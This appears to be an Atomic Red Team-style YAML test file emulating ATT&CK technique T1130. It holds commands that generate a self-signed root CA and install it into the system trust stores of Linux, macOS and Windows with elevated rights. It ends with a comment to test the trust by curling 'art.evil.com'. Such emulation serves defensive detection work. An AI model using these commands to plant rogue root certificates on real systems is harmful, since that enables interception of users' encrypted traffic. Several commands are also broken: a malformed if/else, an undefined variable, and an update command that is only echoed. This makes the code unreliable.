---
attack_technique: T1130
display_name: Install Root Certificate

atomic_tests:
- name: Install root CA on CentOS/RHEL
  description: |
    Creates a root CA with openssl
  supported_platforms:
    - linux
  input_arguments:
    key_filename:
      description: Key we create that is used to create the CA certificate
      type: Path
      default: rootCA.key
    cert_filename:
      description: Path of the CA certificate we create
      type: Path
      default: rootCA.crt
  executor:
    name: sh
    command: |
      openssl genrsa -out #{key_filename} 4096
      openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com" -out #{cert_filename}

      if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -le "5" ];
      then
        cat rootCA.crt >> /etc/pki/tls/certs/ca-bundle.crt
      else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -ge "7" ];
        cp rootCA.crt /etc/pki/ca-trust/source/anchors/
        update-ca-trust
      fi

- name: Install root CA on Debian/Ubuntu
  description: |
    Creates a root CA with openssl
  supported_platforms:
    - linux
  input_arguments:
    key_filename:
      description: Key we create that is used to create the CA certificate
      type: Path
      default: rootCA.key
    cert_filename:
      description: CA file name
      type: Path
      default: rootCA.crt
  dependency_executor_name: command_prompt
  dependencies:
    - description: |
        Verify the certificate exists. It generates if not on disk.
      prereq_command: |
        if [ -f #{cert_filename} ]; then exit 0; else exit 1; fi;
      get_prereq_command: |
        if [ ! -f #{key_filename} ]; then openssl genrsa -out #{key_filename} 4096; fi;
        openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com" -out #{cert_filename}
  executor:
    name: sh
    elevation_required: true
    command: |
        mv #{cert_filename} /usr/local/share/ca-certificates
        echo sudo update-ca-certificates

- name: Install root CA on macOS
  description: |
    Creates a root CA with openssl
  supported_platforms:
    - macos
  input_arguments:
    key_filename:
      description: Key we create that is used to create the CA certificate
      type: Path
      default: rootCA.key
    cert_filename:
      description: CA file name
      type: Path
      default: rootCA.crt
  dependency_executor_name: command_prompt
  dependencies:
    - description: |
        Verify the certificate exists. It generates if not on disk.
      prereq_command: |
        if [ -f #{cert_filename} ]; then exit 0; else exit 1; fi;
      get_prereq_command: |
        if [ ! -f #{key_filename} ]; then openssl genrsa -out #{key_filename} 4096; fi;
        openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com" -out #{cert_filename}
  executor:
    name: command_prompt
    elevation_required: true
    command: |
        sudo security add-trusted-cert -d -r trustRoot -k "/Library/Keychains/System.keychain" "#{cert_filename}"

- name: Install root CA on Windows
  description: |
    Creates a root CA with Powershell
  supported_platforms:
    - windows
  input_arguments:
    pfx_path:
      description: Path of the certificate
      type: Path
      default: rootCA.cer
  dependency_executor_name: powershell
  dependencies:
    - description: |
        Verify the certificate exists. It generates if not on disk.
      prereq_command: |
        if (Test-Path #{cert_filename}) { exit 0 } else { exit 1 }
      get_prereq_command: |
        $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
        Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$cert.Thumbprint -FilePath #{pfx_path}
        Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) | Remove-Item        
  executor:
    name: command_prompt
    elevation_required: true
    command: |
        $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My
        Move-Item -Path $cert.PSPath -Destination "Cert:\LocalMachine\Root"
    cleanup_command: | # For the cleanup we need to load the certificate to check the Thumbprint and remove from both location.
        $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My
        Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) | Remove-Item
        Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) | Remove-Item
        

# TODO: there was some note about testing like this:

# # Testing the trusted certificate.
# To test the new trust, apply the root certificate or another signed with it to
# a SSL/TLS web service and attempt a connection with curl or wget.
#
# curl https://art.evil.com
